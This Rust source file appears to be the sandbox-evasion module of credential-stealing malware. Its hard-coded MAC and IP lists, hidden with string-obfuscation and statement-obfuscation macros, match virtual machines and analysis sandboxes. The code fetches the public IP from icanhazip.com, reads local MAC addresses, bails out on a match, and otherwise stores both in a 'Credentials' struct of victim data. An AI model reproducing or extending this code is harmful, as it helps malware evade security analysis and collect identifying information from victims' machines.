use goldberg::goldberg_stmts;

use obfstr::obfstr as obf;
use reqwest::Client;
use std::sync::{Arc, Mutex};
use mac_address::MacAddressIterator;
use rayon::iter::IntoParallelRefIterator;
use rayon::iter::ParallelIterator;
use crate::global::utils::Credentials;

async fn get_ipaddr() -> String {
    Client::new()
        .get(obf!("https://ipv4.icanhazip.com"))
        .send().await
        .unwrap().text().await.unwrap()
}

async fn get_macaddr() -> Vec<String> {
    MacAddressIterator::new().unwrap().into_iter().map(|mac| mac.to_string()).collect::<Vec<String>>()
}

pub fn get(creds :  &Arc<Mutex<Credentials>>) -> bool {
    goldberg_stmts! {
        let blacklisted_mac: Vec<String> = vec![
            String::from(obf!("00:15:5d:00:07:34")), String::from(obf!("00:e0:4c:b8:7a:58")), String::from(obf!("00:0c:29:2c:c1:21")), String::from(obf!("00:25:90:65:39:e4")), String::from(obf!("c8:9f:1d:b6:58:e4")), String::from(obf!("00:25:90:36:65:0c")), String::from(obf!("00:15:5d:00:00:f3")), String::from(obf!("2e:b8:24:4d:f7:de")),
            String::from(obf!("00:15:5d:13:6d:0c")), String::from(obf!("00:50:56:a0:dd:00")), String::from(obf!("00:15:5d:13:66:ca")), String::from(obf!("56:e8:92:2e:76:0d")), String::from(obf!("ac:1f:6b:d0:48:fe")), String::from(obf!("00:e0:4c:94:1f:20")), String::from(obf!("00:15:5d:00:05:d5")), String::from(obf!("00:e0:4c:4b:4a:40")),
            String::from(obf!("42:01:0a:8a:00:22")), String::from(obf!("00:1b:21:13:15:20")), String::from(obf!("00:15:5d:00:06:43")), String::from(obf!("00:15:5d:1e:01:c8")), String::from(obf!("00:50:56:b3:38:68")), String::from(obf!("60:02:92:3d:f1:69")), String::from(obf!("00:e0:4c:7b:7b:86")), String::from(obf!("00:e0:4c:46:cf:01")),
            String::from(obf!("42:85:07:f4:83:d0")), String::from(obf!("56:b0:6f:ca:0a:e7")), String::from(obf!("12:1b:9e:3c:a6:2c")), String::from(obf!("00:15:5d:00:1c:9a")), String::from(obf!("00:15:5d:00:1a:b9")), String::from(obf!("b6:ed:9d:27:f4:fa")), String::from(obf!("00:15:5d:00:01:81")), String::from(obf!("4e:79:c0:d9:af:c3")),
            String::from(obf!("00:15:5d:b6:e0:cc")), String::from(obf!("00:15:5d:00:02:26")), String::from(obf!("00:50:56:b3:05:b4")), String::from(obf!("1c:99:57:1c:ad:e4")), String::from(obf!("08:00:27:3a:28:73")), String::from(obf!("00:15:5d:00:00:c3")), String::from(obf!("00:50:56:a0:45:03")), String::from(obf!("12:8a:5c:2a:65:d1")),
            String::from(obf!("00:25:90:36:f0:3b")), String::from(obf!("00:1b:21:13:21:26")), String::from(obf!("42:01:0a:8a:00:22")), String::from(obf!("00:1b:21:13:32:51")), String::from(obf!("a6:24:aa:ae:e6:12")), String::from(obf!("08:00:27:45:13:10")), String::from(obf!("00:1b:21:13:26:44")), String::from(obf!("3c:ec:ef:43:fe:de")),
            String::from(obf!("d4:81:d7:ed:25:54")), String::from(obf!("00:25:90:36:65:38")), String::from(obf!("00:03:47:63:8b:de")), String::from(obf!("00:15:5d:00:05:8d")), String::from(obf!("00:0c:29:52:52:50")), String::from(obf!("00:50:56:b3:42:33")), String::from(obf!("3c:ec:ef:44:01:0c")), String::from(obf!("06:75:91:59:3e:02")),
            String::from(obf!("42:01:0a:8a:00:33")), String::from(obf!("ea:f6:f1:a2:33:76")), String::from(obf!("ac:1f:6b:d0:4d:98")), String::from(obf!("1e:6c:34:93:68:64")), String::from(obf!("00:50:56:a0:61:aa")), String::from(obf!("42:01:0a:96:00:22")), String::from(obf!("00:50:56:b3:21:29")), String::from(obf!("00:15:5d:00:00:b3")),
            String::from(obf!("96:2b:e9:43:96:76")), String::from(obf!("b4:a9:5a:b1:c6:fd")), String::from(obf!("d4:81:d7:87:05:ab")), String::from(obf!("ac:1f:6b:d0:49:86")), String::from(obf!("52:54:00:8b:a6:08")), String::from(obf!("00:0c:29:05:d8:6e")), String::from(obf!("00:23:cd:ff:94:f0")), String::from(obf!("00:e0:4c:d6:86:77")),
            String::from(obf!("3c:ec:ef:44:01:aa")), String::from(obf!("00:15:5d:23:4c:a3")), String::from(obf!("00:1b:21:13:33:55")), String::from(obf!("00:15:5d:00:00:a4")), String::from(obf!("16:ef:22:04:af:76")), String::from(obf!("00:15:5d:23:4c:ad")), String::from(obf!("1a:6c:62:60:3b:f4")), String::from(obf!("00:15:5d:00:00:1d")),
            String::from(obf!("00:50:56:a0:cd:a8")), String::from(obf!("00:50:56:b3:fa:23")), String::from(obf!("52:54:00:a0:41:92")), String::from(obf!("00:50:56:b3:f6:57")), String::from(obf!("00:e0:4c:56:42:97")), String::from(obf!("ca:4d:4b:ca:18:cc")), String::from(obf!("f6:a5:41:31:b2:78")), String::from(obf!("d6:03:e4:ab:77:8e")),
            String::from(obf!("00:50:56:ae:b2:b0")), String::from(obf!("00:50:56:b3:94:cb")), String::from(obf!("42:01:0a:8e:00:22")), String::from(obf!("00:50:56:b3:4c:bf")), String::from(obf!("00:50:56:b3:09:9e")), String::from(obf!("00:50:56:b3:38:88")), String::from(obf!("00:50:56:a0:d0:fa")), String::from(obf!("00:50:56:b3:91:c8")),
            String::from(obf!("3e:c1:fd:f1:bf:71")), String::from(obf!("00:50:56:a0:6d:86")), String::from(obf!("00:50:56:a0:af:75")), String::from(obf!("00:50:56:b3:dd:03")), String::from(obf!("c2:ee:af:fd:29:21")), String::from(obf!("00:50:56:b3:ee:e1")), String::from(obf!("00:50:56:a0:84:88")), String::from(obf!("00:1b:21:13:32:20")),
            String::from(obf!("3c:ec:ef:44:00:d0")), String::from(obf!("00:50:56:ae:e5:d5")), String::from(obf!("00:50:56:97:f6:c8")), String::from(obf!("52:54:00:ab:de:59")), String::from(obf!("00:50:56:b3:9e:9e")), String::from(obf!("00:50:56:a0:39:18")), String::from(obf!("32:11:4d:d0:4a:9e")), String::from(obf!("00:50:56:b3:d0:a7")),
            String::from(obf!("94:de:80:de:1a:35")), String::from(obf!("00:50:56:ae:5d:ea")), String::from(obf!("00:50:56:b3:14:59")), String::from(obf!("ea:02:75:3c:90:9f")), String::from(obf!("00:e0:4c:44:76:54")), String::from(obf!("ac:1f:6b:d0:4d:e4")), String::from(obf!("52:54:00:3b:78:24")), String::from(obf!("00:50:56:b3:50:de")),
            String::from(obf!("7e:05:a3:62:9c:4d")), String::from(obf!("52:54:00:b3:e4:71")), String::from(obf!("90:48:9a:9d:d5:24")), String::from(obf!("00:50:56:b3:3b:a6")), String::from(obf!("92:4c:a8:23:fc:2e")), String::from(obf!("5a:e2:a6:a4:44:db")), String::from(obf!("00:50:56:ae:6f:54")), String::from(obf!("42:01:0a:96:00:33")),
            String::from(obf!("00:50:56:97:a1:f8")), String::from(obf!("5e:86:e4:3d:0d:f6")), String::from(obf!("00:50:56:b3:ea:ee")), String::from(obf!("3e:53:81:b7:01:13")), String::from(obf!("00:50:56:97:ec:f2")), String::from(obf!("00:e0:4c:b3:5a:2a")), String::from(obf!("12:f8:87:ab:13:ec")), String::from(obf!("00:50:56:a0:38:06")),
            String::from(obf!("2e:62:e8:47:14:49")), String::from(obf!("00:0d:3a:d2:4f:1f")), String::from(obf!("60:02:92:66:10:79")), String::from(obf!("00:50:56:a0:d7:38")), String::from(obf!("be:00:e5:c5:0c:e5")), String::from(obf!("00:50:56:a0:59:10")), String::from(obf!("00:50:56:a0:06:8d")),
            String::from(obf!("00:e0:4c:cb:62:08")), String::from(obf!("4e:81:81:8e:22:4e")),
        ];
    }
    goldberg_stmts! {
        let blacklisted_ip = vec![
            String::from(obf!("88.132.231.71")), String::from(obf!("78.139.8.50")), String::from(obf!("20.99.160.173")), String::from(obf!("88.153.199.169")), String::from(obf!("84.147.62.12")), String::from(obf!("194.154.78.160")), String::from(obf!("92.211.109.160")), String::from(obf!("195.74.76.222")),
            String::from(obf!("188.105.91.116")), String::from(obf!("34.105.183.68")), String::from(obf!("92.211.55.199")), String::from(obf!("79.104.209.33")), String::from(obf!("95.25.204.90")), String::from(obf!("34.145.89.174")), String::from(obf!("109.74.154.90")), String::from(obf!("109.145.173.169")), String::from(obf!("34.141.146.114")), String::from(obf!("212.119.227.151")), String::from(obf!("195.239.51.59")), String::from(obf!("192.40.57.234")), String::from(obf!("64.124.12.162")), String::from(obf!("34.142.74.220")),
            String::from(obf!("188.105.91.173")), String::from(obf!("109.74.154.91")), String::from(obf!("34.105.72.241")), String::from(obf!("109.74.154.92")), String::from(obf!("213.33.142.50")), String::from(obf!("109.74.154.91")), String::from(obf!("93.216.75.209")), String::from(obf!("192.87.28.103")), String::from(obf!("88.132.226.203")), String::from(obf!("195.181.175.105")), String::from(obf!("88.132.225.100")), String::from(obf!("92.211.192.144")),
            String::from(obf!("34.83.46.130")), String::from(obf!("188.105.91.143")), String::from(obf!("34.85.243.241")), String::from(obf!("34.141.245.25")), String::from(obf!("178.239.165.70")), String::from(obf!("84.147.54.113")), String::from(obf!("193.128.114.45")), String::from(obf!("95.25.81.24")), String::from(obf!("92.211.52.62")), String::from(obf!("88.132.227.238")), String::from(obf!("35.199.6.13")), String::from(obf!("80.211.0.97")),
            String::from(obf!("34.85.253.170")), String::from(obf!("23.128.248.46")), String::from(obf!("35.229.69.227")), String::from(obf!("34.138.96.23")), String::from(obf!("192.211.110.74")), String::from(obf!("35.237.47.12")), String::from(obf!("87.166.50.213")), String::from(obf!("34.253.248.228")), String::from(obf!("212.119.227.167")), String::from(obf!("193.225.193.201")), String::from(obf!("34.145.195.58")), String::from(obf!("34.105.0.27")), String::from(obf!("195.239.51.3")), String::from(obf!("35.192.93.107")),
        ];
    }

    let (mut ip_address, mac_addr) = rayon::join(|| {
        tokio::runtime::Runtime::new().unwrap().block_on(get_ipaddr())
    }, || {
        tokio::runtime::Runtime::new().unwrap().block_on(get_macaddr())
    });

    ip_address = ip_address.replace("\n", "");
    
    if blacklisted_mac.par_iter().any(|mac| mac_addr.iter().any(|m| m == mac)) {
        return true;
    }
    if blacklisted_ip.par_iter().any(|ip| ip == &ip_address) {
        return true;
    }
    creds.lock().unwrap().ip = ip_address;
    creds.lock().unwrap().mac = mac_addr;

    false
}